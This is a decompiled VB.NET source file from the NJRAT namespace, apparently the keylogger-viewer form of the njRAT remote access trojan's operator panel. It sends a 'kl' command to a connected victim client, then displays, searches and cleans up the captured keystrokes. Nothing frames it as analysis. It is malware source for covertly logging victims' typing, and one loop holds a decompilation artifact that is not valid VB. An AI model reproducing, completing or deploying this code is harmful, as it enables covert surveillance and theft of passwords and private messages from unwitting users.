Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x02000015 RID: 21
	<DesignerGenerated()>
	Public Partial Class kl
		Inherits Form

		' Token: 0x060002F0 RID: 752 RVA: 0x001609A4 File Offset: 0x0015EDA4
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = kl.__ENCList
			SyncLock _ENCList
				Dim flag As Boolean = kl.__ENCList.Count = kl.__ENCList.Capacity
				If flag Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = kl.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = kl.__ENCList(num4)
						flag = weakReference.IsAlive
						If flag Then
							Dim flag2 As Boolean = num4 <> num
							If flag2 Then
								kl.__ENCList(num) = kl.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					kl.__ENCList.RemoveRange(num, kl.__ENCList.Count - num)
					kl.__ENCList.Capacity = kl.__ENCList.Count
				End If
				kl.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x17000112 RID: 274
		' (get) Token: 0x060002F3 RID: 755 RVA: 0x001610D8 File Offset: 0x0015F4D8
		' (set) Token: 0x060002F4 RID: 756 RVA: 0x001610F0 File Offset: 0x0015F4F0
		Friend Overridable Property ProgressBar1 As ProgressBar
			<DebuggerNonUserCode()>
			Get
				Return Me._ProgressBar1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ProgressBar)
				Me._ProgressBar1 = value
			End Set
		End Property

		' Token: 0x17000113 RID: 275
		' (get) Token: 0x060002F5 RID: 757 RVA: 0x001610FC File Offset: 0x0015F4FC
		' (set) Token: 0x060002F6 RID: 758 RVA: 0x00161114 File Offset: 0x0015F514
		Friend Overridable Property MenuStrip1 As MenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._MenuStrip1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As MenuStrip)
				Me._MenuStrip1 = value
			End Set
		End Property

		' Token: 0x17000114 RID: 276
		' (get) Token: 0x060002F7 RID: 759 RVA: 0x00161120 File Offset: 0x0015F520
		' (set) Token: 0x060002F8 RID: 760 RVA: 0x00161138 File Offset: 0x0015F538
		Friend Overridable Property ToolStripMenuItem1 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripMenuItem1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem1_Click
				Dim flag As Boolean = Me._ToolStripMenuItem1 IsNot Nothing
				If flag Then
					RemoveHandler Me._ToolStripMenuItem1.Click, value2
				End If
				Me._ToolStripMenuItem1 = value
				flag = (Me._ToolStripMenuItem1 IsNot Nothing)
				If flag Then
					AddHandler Me._ToolStripMenuItem1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000115 RID: 277
		' (get) Token: 0x060002F9 RID: 761 RVA: 0x00161198 File Offset: 0x0015F598
		' (set) Token: 0x060002FA RID: 762 RVA: 0x001611B0 File Offset: 0x0015F5B0
		Friend Overridable Property ToolStripMenuItem2 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripMenuItem2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem2_Click
				Dim flag As Boolean = Me._ToolStripMenuItem2 IsNot Nothing
				If flag Then
					RemoveHandler Me._ToolStripMenuItem2.Click, value2
				End If
				Me._ToolStripMenuItem2 = value
				flag = (Me._ToolStripMenuItem2 IsNot Nothing)
				If flag Then
					AddHandler Me._ToolStripMenuItem2.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000116 RID: 278
		' (get) Token: 0x060002FB RID: 763 RVA: 0x00161210 File Offset: 0x0015F610
		' (set) Token: 0x060002FC RID: 764 RVA: 0x00161228 File Offset: 0x0015F628
		Friend Overridable Property TFind As ToolStripTextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TFind
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripTextBox)
				Me._TFind = value
			End Set
		End Property

		' Token: 0x17000117 RID: 279
		' (get) Token: 0x060002FD RID: 765 RVA: 0x00161234 File Offset: 0x0015F634
		' (set) Token: 0x060002FE RID: 766 RVA: 0x0016124C File Offset: 0x0015F64C
		Friend Overridable Property ToolStripMenuItem3 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripMenuItem3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem3_Click
				Dim flag As Boolean = Me._ToolStripMenuItem3 IsNot Nothing
				If flag Then
					RemoveHandler Me._ToolStripMenuItem3.Click, value2
				End If
				Me._ToolStripMenuItem3 = value
				flag = (Me._ToolStripMenuItem3 IsNot Nothing)
				If flag Then
					AddHandler Me._ToolStripMenuItem3.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000118 RID: 280
		' (get) Token: 0x060002FF RID: 767 RVA: 0x001612AC File Offset: 0x0015F6AC
		' (set) Token: 0x06000300 RID: 768 RVA: 0x001612C4 File Offset: 0x0015F6C4
		Friend Overridable Property T1 As RichTextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._T1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RichTextBox)
				Me._T1 = value
			End Set
		End Property

		' Token: 0x17000119 RID: 281
		' (get) Token: 0x06000301 RID: 769 RVA: 0x001612D0 File Offset: 0x0015F6D0
		' (set) Token: 0x06000302 RID: 770 RVA: 0x001612E8 File Offset: 0x0015F6E8
		Friend Overridable Property ContextMenuStrip1 As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._ContextMenuStrip1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._ContextMenuStrip1 = value
			End Set
		End Property

		' Token: 0x1700011A RID: 282
		' (get) Token: 0x06000303 RID: 771 RVA: 0x001612F4 File Offset: 0x0015F6F4
		' (set) Token: 0x06000304 RID: 772 RVA: 0x0016130C File Offset: 0x0015F70C
		Friend Overridable Property CopyToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._CopyToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopyToolStripMenuItem_Click
				Dim flag As Boolean = Me._CopyToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._CopyToolStripMenuItem.Click, value2
				End If
				Me._CopyToolStripMenuItem = value
				flag = (Me._CopyToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._CopyToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700011B RID: 283
		' (get) Token: 0x06000305 RID: 773 RVA: 0x0016136C File Offset: 0x0015F76C
		' (set) Token: 0x06000306 RID: 774 RVA: 0x00161384 File Offset: 0x0015F784
		Friend Overridable Property SelectAllToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._SelectAllToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.SelectAllToolStripMenuItem_Click
				Dim flag As Boolean = Me._SelectAllToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._SelectAllToolStripMenuItem.Click, value2
				End If
				Me._SelectAllToolStripMenuItem = value
				flag = (Me._SelectAllToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._SelectAllToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x06000307 RID: 775 RVA: 0x001613E4 File Offset: 0x0015F7E4
		Public Sub New()
			kl.__ENCAddToList(Me)
			Me.listViewItem_0 = Nothing
			Me.InitializeComponent()
		End Sub

		' Token: 0x06000308 RID: 776 RVA: 0x00161404 File Offset: 0x0015F804
		Public Sub insert(T As String)
			Dim flag As Boolean = T.StartsWith(ChrW(1)) And T.EndsWith(ChrW(1))
			If flag Then
				Me.T1.SelectionFont = New Font(Me.T1.Font, FontStyle.Bold)
				Me.T1.SelectionColor = Color.Green
				Me.T1.AppendText(vbCrLf & "[ " + T.Replace(ChrW(1), String.Empty) + "]" & vbCrLf)
			Else
				Me.T1.SelectionFont = Me.T1.Font
				Me.T1.SelectionColor = Me.T1.ForeColor
				Me.T1.AppendText(T + vbCrLf)
			End If
		End Sub

		' Token: 0x06000309 RID: 777 RVA: 0x001614D0 File Offset: 0x0015F8D0
		Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Me.T1.Copy()
		End Sub

		' Token: 0x0600030A RID: 778 RVA: 0x001614E0 File Offset: 0x0015F8E0
		Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Try
				Me.c.Send("kl")
				Me.ToolStripMenuItem1.Enabled = False
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600030B RID: 779 RVA: 0x00161530 File Offset: 0x0015F930
		Private Sub SelectAllToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Me.T1.SelectAll()
		End Sub

		' Token: 0x0600030C RID: 780 RVA: 0x00161540 File Offset: 0x0015F940
		Private Sub ToolStripMenuItem2_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.T1.Find(Me.TFind.Text, Me.T1.SelectionStart + Me.T1.SelectionLength, RichTextBoxFinds.None) = -1
			If flag Then
				Me.T1.Find(Me.TFind.Text, 0, RichTextBoxFinds.None)
			End If
		End Sub

		' Token: 0x0600030D RID: 781 RVA: 0x001615A0 File Offset: 0x0015F9A0
		Private Sub ToolStripMenuItem3_Click(sender As Object, e As EventArgs)
			Try
				Dim num As Integer = 1
				Dim dataObject As IDataObject = Clipboard.GetDataObject()
				Me.T1.[ReadOnly] = False
				While num <> -1
					num = Me.T1.Find("[Back]", num, RichTextBoxFinds.None)
					Dim flag As Boolean = num > 0
					If flag Then
						Dim left As String = Me.T1.Text(num - 1).ToString()
						flag = (Operators.CompareString(left, "]", False) = 0 OrElse Operators.CompareString(left, vbLf, False) = 0)
						If flag Then
							Me.T1.[Select](num, "[back]".Length)
							Me.T1.Cut()
						Else
							Me.T1.[Select](num - 1, "[back]".Length + 1)
							Me.T1.Cut()
						End If
					End If
				End While
				Clipboard.SetDataObject(dataObject)
				Me.T1.[ReadOnly] = True
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0400014B RID: 331
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x0400014D RID: 333
		<AccessedThroughProperty("ProgressBar1")>
		Private _ProgressBar1 As ProgressBar

		' Token: 0x0400014E RID: 334
		<AccessedThroughProperty("MenuStrip1")>
		Private _MenuStrip1 As MenuStrip

		' Token: 0x0400014F RID: 335
		<AccessedThroughProperty("ToolStripMenuItem1")>
		Private _ToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x04000150 RID: 336
		<AccessedThroughProperty("ToolStripMenuItem2")>
		Private _ToolStripMenuItem2 As ToolStripMenuItem

		' Token: 0x04000151 RID: 337
		<AccessedThroughProperty("TFind")>
		Private _TFind As ToolStripTextBox

		' Token: 0x04000152 RID: 338
		<AccessedThroughProperty("ToolStripMenuItem3")>
		Private _ToolStripMenuItem3 As ToolStripMenuItem

		' Token: 0x04000153 RID: 339
		<AccessedThroughProperty("T1")>
		Private _T1 As RichTextBox

		' Token: 0x04000154 RID: 340
		<AccessedThroughProperty("ContextMenuStrip1")>
		Private _ContextMenuStrip1 As ContextMenuStrip

		' Token: 0x04000155 RID: 341
		<AccessedThroughProperty("CopyToolStripMenuItem")>
		Private _CopyToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000156 RID: 342
		<AccessedThroughProperty("SelectAllToolStripMenuItem")>
		Private _SelectAllToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000157 RID: 343
		Public c As Client

		' Token: 0x04000158 RID: 344
		Private listViewItem_0 As ListViewItem
	End Class
End Namespace
